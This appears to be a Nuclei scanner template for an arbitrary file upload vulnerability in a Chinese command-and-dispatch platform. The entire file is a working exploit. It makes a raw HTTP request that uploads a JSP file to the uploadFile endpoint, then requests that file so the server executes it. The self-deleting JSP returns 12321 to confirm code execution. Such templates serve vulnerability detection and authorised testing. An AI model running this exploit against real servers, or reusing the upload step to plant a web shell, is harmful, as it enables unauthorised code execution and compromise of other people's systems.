id: vfcad-uploadfile-fileupload
info:
  name: 可视化融合指挥调度平台 uploadFile 任意文件上传
  author: SleepingBag945
  severity: critical

variables:
  filename: "{{to_lower(rand_base(10))}}"

http:
  - raw:
      - |
        POST /dispatch/layuiIm/uploadFile HTTP/1.1
        Host: {{Hostname}}
        Sec-Ch-Ua: "(Not(A:Brand";v="8", "Chromium";v="98"
        Sec-Ch-Ua-Mobile: ?0
        Sec-Ch-Ua-Platform: "Windows"
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
        Sec-Fetch-Site: none
        Sec-Fetch-Mode: navigate
        Sec-Fetch-User: ?1
        Sec-Fetch-Dest: document
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Connection: close
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7ctER307B0RaQwOp
        Content-Length: 151

        ------WebKitFormBoundary7ctER307B0RaQwOp
        Content-Disposition: form-data; name="file";filename="{{filename}}.jsp"

        <%out.print(111 * 111);new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
        ------WebKitFormBoundary7ctER307B0RaQwOp-


      - |
        GET {{jspfilenammme}} HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
        
    extractors:
      - type: regex
        part: body
        name: jspfilenammme
        group: 1
        internal: true
        regex:
          - '"src":"(.*?)"' 

    matchers:
      - type: dsl
        dsl:
          - 'status_code==200 && contains(body_2,"12321")'
